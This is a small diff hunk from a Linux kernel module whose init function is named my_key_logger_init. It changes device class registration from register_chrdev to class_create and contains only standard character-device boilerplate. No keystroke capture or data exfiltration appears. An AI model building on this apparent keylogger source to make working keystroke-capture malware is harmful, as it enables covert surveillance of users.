@@ -46,7 +46,7 @@ static int __init my_key_logger_init(void){
   printk(KERN_INFO "%s: registered majour num", CLASS_NAME);
   
   // register dev class
-  mkl_class = register_chrdev(0, DEVICE_NAME, &fops);
+  mkl_class = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(mkl_class)) {
     unregister_chrdev(majourNumber, DEVICE_NAME);
     printk(KERN_ALERT "%s: failed to register dev class", CLASS_NAME);
